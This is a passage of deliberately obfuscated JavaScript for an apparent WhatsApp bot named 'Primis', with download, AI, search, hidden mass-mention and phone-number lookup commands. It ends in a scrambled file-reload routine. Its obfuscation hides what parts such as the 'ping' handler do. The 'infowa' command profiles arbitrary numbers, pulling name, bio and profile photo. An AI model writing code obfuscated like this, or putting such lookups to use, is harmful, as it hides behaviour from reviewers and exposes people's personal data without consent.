          くめうめみか[すたきや[41] + すたきや[42]](うぬせ[すたきや[446]], {
            [すたきや[43]]: やへま,
            [すたきや[130] + すたきや[401]]: よきなな[すたきや[410]](くめうめみか => {
              return くめうめみか[すたきや[47]];
            })
          }, {
            [すたきや[184]]: へくしねぬた
          });
        }
        break;
      case すたきや[785]:
        {
          if (!q) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[785] + " https" + "://vt." + すたきや[785] + ".com/." + すたきや[786]));
          }
          let けほさくも = await にむくのや(すたきや[169] + すたきや[790] + すたきや[791] + すたきや[792] + すたきや[793] + すたきや[384] + q);
          if (!けほさくも || !けほさくも[すたきや[787]] || !けほさくも[すたきや[787]][すたきや[789]]) {
            return にひすもゆ("Failed to retrieve TikTok data");
          }
          await くめうめみか[すたきや[41] + すたきや[42]](うぬせ[すたきや[446]], {
            [すたきや[788]]: {
              [すたきや[122]]: けほさくも[すたきや[787]][すたきや[789]]
            },
            [すたきや[70] + すたきや[71]]: "✅)"
          });
        }
        break;
      case すたきや[785] + "slide":
        {
          if (!q) {
            return にひすもゆ(すたきや[584] + たちとた + ("tiktokslide https://vt.tiktok.com/." + すたきや[786]));
          }
          let けほさくも = await にむくのや(すたきや[169] + すたきや[790] + すたきや[791] + すたきや[792] + すたきや[793] + すたきや[384] + q);
          if (!けほさくも || !けほさくも[すたきや[787]] || !けほさくも[すたきや[787]][すたきや[794]] || けほさくも[すたきや[787]][すたきや[794]][すたきや[79]] === すたきや[0]) {
            return にひすもゆ("Slides are not available in this video");
          }
          const たへしまぬ = {
            [すたきや[126] + すたきや[127] + すたきや[103]]: {
              [すたきや[104] + すたきや[44]]: {
                [すたきや[104] + すたきや[270] + すたきや[271]]: {
                  [すたきや[105] + すたきや[106] + すたきや[107]]: {},
                  [すたきや[105] + すたきや[106] + すたきや[107] + すたきや[392] + すたきや[71]]: すたきや[12]
                },
                [すたきや[393] + すたきや[118] + すたきや[103]]: {
                  [すたきや[395]]: けほさくも[すたきや[787]][すたきや[794]][すたきや[478]](すたきや[0], すたきや[795])[すたきや[410]]((くめうめみか, うぬせ) => {
                    return {
                      cardId: "card_" + うぬせ,
                      card: {
                        [すたきや[113]]: {
                          [すたきや[98]]: "TikTok Slide" + すたきや[39] + (うぬせ + すたきや[1]) + すたきや[796] + けほさくも[すたきや[787]][すたきや[794]][すたきや[79]],
                          subtitle: "URL: " + くめうめみか["substr" + すたきや[819]](すたきや[0], すたきや[18]) + "...",
                          [すたきや[389] + すたきや[46]]: {
                            [すたきや[122]]: くめうめみか,
                            [すたきや[329] + すたきや[211]]: すたきや[375] + すたきや[376]
                          }
                        },
                        [すたきや[92]]: "🖼️ Swipe to see the next imag" + すたきや[797],
                        [すたきや[110]]: "Slide to " + (うぬせ + すたきや[1])
                      }
                    };
                  })
                }
              }
            }
          };
          await くめうめみか[すたきや[41] + すたきや[42]](うぬせ[すたきや[446]], たへしまぬ);
        }
        break;
      case すたきや[785] + すたきや[426]:
        {
          if (!q) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[785] + "audio " + すたきや[169] + "//vt.t" + "iktok." + "com/.." + すたきや[11]));
          }
          let けほさくも = await にむくのや(すたきや[169] + すたきや[790] + すたきや[791] + すたきや[792] + すたきや[793] + すたきや[384] + q);
          if (!けほさくも || !けほさくも[すたきや[787]] || !けほさくも[すたきや[787]][すたきや[798]]) {
            return にひすもゆ("Audio not found");
          }
          await くめうめみか[すたきや[41] + すたきや[42]](うぬせ[すたきや[446]], {
            [すたきや[426]]: {
              [すたきや[122]]: けほさくも[すたきや[787]][すたきや[798]]
            },
            [すたきや[329] + すたきや[211]]: "audio/" + すたきや[827]
          });
        }
        break;
      case "ping":
      case すたきや[799]:
        await くめうめみか[すたきや[41] + すたきや[42]](ゆとこそおほ, {
          react: {
            [すたきや[43]]: "🚀",
            [すたきや[45]]: うぬせ[すたきや[45]]
          }
        });
        {
          えめくひとね(みせふ);
          async function みせふ(...うぬせ) {
            var ゆえつみおか = {
              get [すたきや[40]]() {
                return くめうめみか;
              },
              [すたきや[800]](...うぬせ) {
                return とふすせ(...うぬせ);
              }
            };
            return まうぬへ(うぬせ, ゆえつみおか);
          }
          みせふ(ゆとこそおほ);
        }
        break;
      case "idch":
        {
          if (!q) {
            return にひすもゆ("❗ Include channel lin" + すたきや[774]);
          }
          if (!q[すたきや[476] + すたきや[477]]("https://whatsapp.com/channel/")) {
            return にひすもゆ("❗ Invalid link");
          }
          let とふう = q[すたきや[469]](すたきや[169] + "//what" + "sapp.c" + "om/cha" + "nnel/")[すたきや[1]];
          let かやう = await くめうめみか[すたきや[210] + すたきや[801] + すたきや[107]](すたきや[48], とふう);
          let やへま = "- *ID " + すたきや[629] + かやう[すたきや[47]] + ("*\n- *Name :*" + すたきや[39]) + かやう[すたきや[90]] + "\n- *Total Followers :* " + かやう.subscribers + "\n- *Status :* " + かやう.state + "\n- *Verified :* " + (かやう.verification == "VERIFIED" ? "Verifi" + すたきや[802] : "No");
          const つくへそ = await のよむねあ(うぬせ[すたきや[446]], {
            [すたきや[126] + すたきや[127] + すたきや[103]]: {
              [すたきや[104] + すたきや[44]]: {
                [すたきや[104] + すたきや[270] + すたきや[271]]: {
                  [すたきや[105] + すたきや[106] + すたきや[107]]: {},
                  [すたきや[105] + すたきや[106] + すたきや[107] + すたきや[392] + すたきや[71]]: すたきや[12]
                },
                [すたきや[108] + すたきや[93] + すたきや[46]]: {
                  [すたきや[92]]: {
                    [すたきや[43]]: やへま
                  },
                  [すたきや[110]]: {
                    [すたきや[43]]: "           ---( We For Primis )---"
                  },
                  [すたきや[89] + すたきや[102] + すたきや[42]]: {
                    [すたきや[78] + すたきや[77]]: [{
                      [すたきや[90]]: "cta_copy",
                      [すたきや[78] + すたきや[297] + すたきや[91]]: "{\"display_text\": \"Copy ID\",\"copy_code\": \"" + かやう[すたきや[47]] + "\"}"
                    }]
                  }
                }
              }
            }
          }, {
            [すたきや[184]]: へくしねぬた
          });
          await くめうめみか[すたきや[49] + すたきや[46]](うぬせ[すたきや[446]], つくへそ[すたきや[104] + すたきや[44]], {
            [すたきや[104] + すたきや[172]]: つくへそ[すたきや[45]][すたきや[47]]
          });
        }
        break;
      case "infowa":
        {
          if (!q) {
            return にひすもゆ(すたきや[822] + すたきや[823] + すたきや[824] + "mple:\n" + なくそに + (すたきや[585] + すたきや[592]));
          }
          const へくとつま = q[すたきや[475] + すたきや[44]](new RegExp(すたきや[581], すたきや[14]), "");
          const あめほゆめ = へくとつま + (すたきや[80] + すたきや[81] + すたきや[82]);
          try {
            const ぬちそ = await くめうめみか[すたきや[803] + すたきや[804]](へくとつま)[すたきや[734]](() => {
              return すたきや[37];
            });
            const はねつ = ぬちそ?.[すたきや[0]];
            if (!はねつ || !はねつ[すたきや[811]]) {
              return くめうめみか[すたきや[41] + すたきや[42]](うぬせ[すたきや[446]], {
                [すたきや[43]]: "❌ Number +" + へくとつま + " *NOT REGISTERED* on WhatsApp."
              }, {
                [すたきや[184]]: へくしねぬた
              });
            }
            let あぬゆささむ = "Not availabl" + すたきや[44];
            try {
              const めたま = await くめうめみか[すたきや[803] + すたきや[804]](あめほゆめ)[すたきや[734]](() => {
                return すたきや[37];
              });
              あぬゆささむ = めたま?.[すたきや[0]]?.notify || めたま?.[すたきや[0]]?.name || あぬゆささむ;
            } catch {}
            let きせつ = {
              [すたきや[85]]: すたきや[814],
              setAt: すたきや[37]
            };
            try {
              const むまふ = await くめうめみか.fetchStatus(あめほゆめ)[すたきや[734]](() => {
                return すたきや[37];
              });
              if (むまふ && typeof むまふ === "object") {
                きせつ = むまふ;
              }
            } catch {}
            let おちねめふむ = すたきや[807];
            try {
              const すくし = きせつ?.setAt;
              const まよまは = すくし ? Number(すくし) : NaN;
              if (!Number.isNaN(まよまは) && まよまは > すたきや[0]) {
                おちねめふむ = new Date(まよまは)[すたきや[805] + すたきや[806] + すたきや[21]]("id-ID", {
                  timeZone: "Asia/Jakarta",
                  hour12: すたきや[2]
                }) + " WIB";
              }
            } catch {
              おちねめふむ = すたきや[807];
            }
            let あせなゆもま = "No Profile Photo";
            try {
              const ふくつせや = await くめうめみか["profil" + すたきや[808] + "reUrl"](あめほゆめ, すたきや[442])[すたきや[734]](() => {
                return すたきや[37];
              });
              if (ふくつせや) {
                あせなゆもま = ふくつせや;
              }
            } catch {}
            const いかとねくへ = はねつ?.status === すたきや[813] + "ss" ? "Business Acc" + すたきや[809] : "Personal Acc" + すたきや[809];
            const にかほつね = {
              Bot: すたきや[256] + " Check" + "er Bot",
              [すたきや[90]]: あぬゆささむ,
              [すたきや[810]]: "+" + へくとつま,
              [すたきや[811]]: すたきや[4],
              tipe: いかとねくへ,
              [すたきや[812]]: はねつ?.lid || すたきや[37],
              [すたきや[813] + "ssInfo"]: はねつ?.businessInfo || すたきや[37],
              bio: typeof きせつ?.status === すたきや[24] ? きせつ[すたきや[85]] : すたきや[814],
              ["bioUpd" + すたきや[815]]: おちねめふむ,
              photoProfile: あせなゆもま,
              ["copyri" + すたきや[816]]: "© Copyright " + すたきや[817] + すたきや[818]
            };
            const やへま = "```\n" + JSON[すたきや[24] + すたきや[300]](にかほつね, すたきや[37], すたきや[12]) + "\n```";
            await くめうめみか[すたきや[41] + すたきや[42]](うぬせ[すたきや[446]], {
              [すたきや[43]]: やへま
            }, {
              [すたきや[184]]: へくしねぬた
            });
          } catch (くえもいかお) {
            await くめうめみか[すたきや[41] + すたきや[42]](うぬせ[すたきや[446]], {
              [すたきや[43]]: "❌ There is a" + すたきや[33] + "r.\nErr" + "or: " + String(くえもいかお)
            }, {
              [すたきや[184]]: へくしねぬた
            });
          }
        }
        break;
      case "ai":
        {
          if (!q) {
            return にひすもゆ("*Syntax Error*\nExample:\n" + なくそに + " What day is today");
          }
          const たさかあ = encodeURIComponent(q);
          const おおさ = "https://api-faa.my.id/faa/ai-realtime?text=" + たさかあ;
          try {
            await くめうめみか["sendPresence" + すたきや[771]]("compos" + すたきや[819], うぬせ[すたきや[446]]);
            const かやう = await fetch(おおさ)[すたきや[820]](くめうめみか => {
              return くめうめみか.json();
            });
            if (!かやう || !かやう[すたきや[821]]) {
              return にひすもゆ("❌ Failed to get response from AI.");
            }
            const まにつ = かやう[すたきや[821]];
            return くめうめみか[すたきや[41] + すたきや[42]](うぬせ[すたきや[446]], {
              [すたきや[43]]: "🤖 *Primis*:" + すたきや[831] + まにつ
            }, {
              [すたきや[184]]: へくしねぬた
            });
          } catch (くえもいかお) {
            return にひすもゆ("❌ There is an error.\nError: " + String(くえもいかお));
          }
        }
        break;
      case "hideta" + すたきや[14]:
        {
          if (!くまにまうつ) {
            return にひすもゆ(すたきや[743] + すたきや[744] + すたきや[745] + すたきや[746]);
          }
          let よひよ = q ? q : "";
          let みえつせむ = よきなな[すたきや[410]](くめうめみか => {
            return くめうめみか[すたきや[47]];
          });
          try {
            await くめうめみか[すたきや[41] + すたきや[42]](ゆとこそおほ, {
              [すたきや[43]]: よひよ,
              [すたきや[130] + すたきや[401]]: みえつせむ
            }, {
              [すたきや[184]]: へくしねぬた
            });
          } catch (ひそゆつけて) {
            console[すたきや[295]](すたきや[783] + "sendin" + "g mess" + "age:", ひそゆつけて);
            にひすもゆ("An error occurred while sending the message.");
          }
        }
        break;
      case "ig":
      case "instagram":
        {
          if (!q) {
            return にひすもゆ(すたきや[822] + すたきや[823] + すたきや[824] + すたきや[603] + "ig <li" + "nk Ins" + "tagram" + ">");
          }
          let つくへそ = await くめうめみか[すたきや[41] + すたきや[42]](うぬせ[すたきや[446]], {
            [すたきや[43]]: "⏳ Downloading video..."
          }, {
            [すたきや[184]]: へくしねぬた
          });
          try {
            let そせかにに = "https://api.siputzx.my.id/api/d/igdl?url=" + encodeURIComponent(q);
            let {
              [すたきや[787]]: はねつ
            } = await ねゆなのへき.get(そせかにに);
            if (!はねつ[すたきや[85]] || !Array[すたきや[825] + すたきや[424]](はねつ[すたきや[787]]) || はねつ[すたきや[787]][すたきや[79]] === すたきや[0]) {
              return にひすもゆ(すたきや[714] + すたきや[715] + "retrie" + "ve vid" + "eo. Ch" + "eck th" + "e link" + すたきや[11]);
            }
            let かはく = はねつ[すたきや[787]][すたきや[0]];
            let ちおもてのた = "🎬 *Instagram Downloader*\n📸 " + (かはく["filena" + すたきや[222]] || "Video " + すたきや[826] + "ad res" + "ults") + "\n\n—© Copyright By Primis";
            await くめうめみか[すたきや[41] + すたきや[42]](うぬせ[すたきや[446]], {
              [すたきや[788]]: {
                [すたきや[122]]: かはく[すたきや[122]]
              },
              [すたきや[70] + すたきや[71]]: ちおもてのた,
              [すたきや[329] + すたきや[211]]: "video/" + すたきや[827]
            }, {
              [すたきや[184]]: へくしねぬた
            });
            await くめうめみか[すたきや[41] + すたきや[42]](うぬせ[すたきや[446]], {
              [すたきや[736]]: つくへそ[すたきや[45]]
            });
          } catch (さゆつす) {
            console[すたきや[295]](さゆつす);
            にひすもゆ("❌ A server error occurred or the video could not be downloaded..");
          }
        }
        break;
      case すたきや[829] + すたきや[828]:
        {
          if (!q) {
            return にひすもゆ(すたきや[584] + たちとた + (すたきや[829] + "ch Pri" + "mis Cr" + "asher"));
          }
          let かやう = await にむくのや("https://api.ryzendesu.vip/api/search/youtube?query=" + q);
          if (!かやう || !かやう[すたきや[821]]) {
            return にひすもゆ("No results f" + すたきや[830]);
          }
          let やへま = "🔎 *YouTube Search:* " + q + すたきや[831];
          let かすむても = すたきや[1];
          for (let えゆと of かやう[すたきや[821]][すたきや[478]](すたきや[0], すたきや[795])) {
            やへま += "" + かすむても++ + ". *" + えゆと[すたきや[98]] + ("*\n↳ Duration" + すたきや[629]) + えゆと["durati" + すたきや[832]] + "\n↳ Link: " + えゆと[すたきや[122]] + すたきや[831];
          }
          にひすもゆ(やへま[すたきや[480]]());
        }
        break;
      default:
    }
  } catch (さゆつす) {
    console[すたきや[295]](そむひあはな.red("[ CATCH ERROR ]"), さこゆひ[すたきや[150]](さゆつす));
  }
};
let くまにまうつ = require[すたきや[474] + すたきや[44]](__filename);
require("fs").watchFile(くまにまうつ, () => {
  function* くめうめみか(くめうめみか, ゆえつみおか, すかく, めはぬこ, ちせそ = {
    もふけあつ: {}
  }) {
    while (くめうめみか + ゆえつみおか + すかく + めはぬこ !== 46) {
      with (ちせそ.のてほさ || ちせそ) {
        switch (くめうめみか + ゆえつみおか + すかく + めはぬこ) {
          case ちせそ.もふけあつ.ふなぬせみい + -332:
            くめうめみか += 263;
            ゆえつみおか += -49;
            すかく += 257;
            めはぬこ += -309;
            break;
          case 94:
          case めはぬこ != -238 && めはぬこ != 133 && めはぬこ + 101:
          case 192:
            くめうめみか += 241;
            ゆえつみおか += -9;
            すかく += -300;
            めはぬこ += 7;
            break;
          case 74:
          case 36:
            くめうめみか += -356;
            ゆえつみおか += 320;
            すかく += 176;
            めはぬこ += -168;
            break;
          case 179:
          case -110:
            [ちせそ.もふけあつ.こいにい, ちせそ.もふけあつ.ふなぬせみい] = [55, 216];
            require("fs").unwatchFile(くまにまうつ);
            console[すたきや[440]](そむひあはな.greenBright("[ UPDATED ] " + __filename + " updated!"));
            delete require.cache[くまにまうつ];
            うぬせ = true;
            return require(くまにまうつ);
            くめうめみか += 22;
            ゆえつみおか += 183;
            すかく += 128;
            めはぬこ += -466;
            break;
          case -137:
            くめうめみか += 263;
            ゆえつみおか += 174;
            すかく += -172;
            めはぬこ += -82;
            break;
          default:
            [ちせそ.もふけあつ.こいにい, ちせそ.もふけあつ.ふなぬせみい] = [73, -218];
            くめうめみか += 206;
            すかく += 257;
            めはぬこ += -414;
            break;
          case ちせそ.もふけあつ.こいにい + 179:
            くめうめみか += 57;
            ゆえつみおか += 174;
            すかく += -429;
            めはぬこ += -39;
            break;
        }
      }
    }
  }
  var うぬせ;
  var ゆえつみおか = くめうめみか(198, -97, -68, 146).next().value;
  if (うぬせ) {
    return ゆえつみおか;
  }
});